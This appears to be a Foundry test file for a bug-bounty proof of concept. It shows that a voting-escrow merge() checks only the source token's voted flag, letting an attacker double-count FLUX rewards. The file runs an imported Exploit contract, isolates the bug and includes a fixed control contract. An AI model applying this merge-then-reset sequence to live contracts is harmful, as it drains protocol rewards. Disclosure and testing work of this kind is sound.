// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./38186-attacker-can-gain-infinitive-flux-by-repeating-this-attack-i.sol";

contract MergeResetDoubleAccrualTest is Test {
    /// @notice HARM: run() proves that merging two already-reset positions
    ///         into a third, not-yet-reset position lets the attacker accrue
    ///         FLUX for the merged-in balances TWICE in the same epoch.
    function test_exploit_mergeThenReset_doubleCountsFlux() public {
        // Matches the Playground's anvil_state.json block timestamp
        // (0x65b0a380 = 1706075008) -- a realistic nonzero epoch, exactly
        // what the in-browser synthetic run naturally has. The Exploit
        // contract itself uses NO cheatcodes; this vm.warp only sets the
        // ambient block timestamp before deploying/running it, mirroring
        // the Playground's own starting block context.
        vm.warp(1706075008);

        Exploit e = new Exploit();
        e.run();

        uint256 claimed = e.flux().balanceOf(address(e));
        assertEq(claimed, 5 * e.BAL(), "claimed FLUX should be 5x BAL (2x honest + 3x double-counted)");
        assertGt(claimed, 3 * e.BAL(), "must exceed the honest one-reset-per-position total (3x BAL)");
    }

    /// @notice Isolates the exact mechanism: merge()'s guard only checks
    ///         voted[_from], never voted[_to] -- so merging INTO an
    ///         already-voted (or about-to-be-reset) token is unrestricted.
    function test_buggyMerge_ignoresToTokenVotedState() public {
        VotingEscrow ve = new VotingEscrow();
        ve.setVoter(address(this));
        ve.setBalance(1, 100 ether);
        ve.setBalance(2, 200 ether);

        ve.voting(2); // id2 is "in progress" (voted == true)
        ve.abstain(1); // id1 is NOT voted -- satisfies merge()'s only check

        // BUG: merge succeeds even though voted[2] == true -- merge() never checks _to.
        ve.merge(1, 2);
        assertEq(ve.balanceOf(2), 300 ether, "merge succeeded into a voted-in-progress token");
        assertTrue(ve.voted(2), "id2's voted flag is untouched by merge -- still true");
    }

    /// @notice Control: with the fix (merge() also requires !voted[_to]),
    ///         merging into an about-to-be-reset token reverts, blocking the
    ///         double-accrual sequence entirely.
    function test_control_fixedMerge_blocksMergeIntoVotedToken() public {
        FixedVotingEscrow ve = new FixedVotingEscrow();
        ve.setVoter(address(this));
        ve.setBalance(1, 100 ether);
        ve.setBalance(2, 200 ether);

        ve.voting(2);
        ve.abstain(1);

        vm.expectRevert(bytes("voting in progress for token"));
        ve.merge(1, 2);
    }
}

/// @notice Fixed variant for the control test: merge() ALSO requires
///         !voted[_to], blocking a merge into a not-yet-reset token.
contract FixedVotingEscrow {
    address public voter;
    address public admin;
    mapping(uint256 => uint256) public balanceOf;
    mapping(uint256 => bool) public voted;

    constructor() {
        admin = msg.sender;
    }

    function setVoter(address _voter) external {
        require(msg.sender == admin, "not admin");
        voter = _voter;
    }

    function setBalance(uint256 tokenId, uint256 amount) external {
        balanceOf[tokenId] = amount;
    }

    function voting(uint256 tokenId) external {
        require(msg.sender == voter, "not voter");
        voted[tokenId] = true;
    }

    function abstain(uint256 tokenId) external {
        require(msg.sender == voter, "not voter");
        voted[tokenId] = false;
    }

    function merge(uint256 _from, uint256 _to) external {
        require(!voted[_from], "voting in progress for token");
        require(!voted[_to], "voting in progress for token"); // FIX applied
        require(_from != _to, "must be different tokens");

        uint256 value = balanceOf[_from];
        balanceOf[_from] = 0;
        balanceOf[_to] += value;
    }
}
